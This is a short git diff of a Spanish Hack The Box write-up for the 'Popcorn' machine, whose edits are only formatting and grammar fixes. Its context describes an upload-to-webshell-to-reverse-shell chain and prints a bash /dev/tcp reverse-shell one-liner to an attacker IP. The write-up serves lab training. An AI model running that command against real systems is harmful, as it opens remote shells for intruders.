@@ -14,8 +14,8 @@ categories:
 tags:
   - Arbitrary File Upload 
 ---
-
 ![](/assets/images/htb-writeup-popcorn/popcorn_logo.png)
+
 
 La máquina "Popcorn" en Hack The Box representa un desafío de dificultad media.El análisis comienza con la identificación de una vulnerabilidad en el servicio de Torrent host, que permite una carga de imagen de screenshot comprometedora. A través de esta vía, se logra la ejecución de código PHP para obtener una webshell, lo que abre la puerta a una posible explotación más profunda del sistema objetivo. La creación de una reverseshell permite el control desde la máquina atacante, resaltando la importancia de una segmentación adecuada de la red y la protección contra amenazas externas.La fase de escalada de privilegios revela un sistema operativo desactualizado, un hallazgo crítico que puede ser aprovechado con una Proof Of Concept (PoC). Este descubrimiento pone de manifiesto la necesidad de implementar políticas de parcheo y actualización en entornos corporativos, destacando las graves implicaciones de mantener sistemas sin actualizar.
 
@@ -155,7 +155,7 @@ Antes de ejecutar la revershell, nos ponemos en escucha en 'nc'.
 
 Ahora podemos obtener una shell ejecutando el comando "bash -c sh -i >& /dev/tcp/10.10.14.4/443 0>&1"
 
-><p style="font-size: 16px;"> NOTA: es importante codificar la revershell para que el server no de problemas con la interpretación de los caracteres especiales </p>
+><p style="font-size: 16px;"> NOTA: es importante codificar la revershell para que el server no nos de problemas con la interpretación de los caracteres especiales </p>
 
 
 
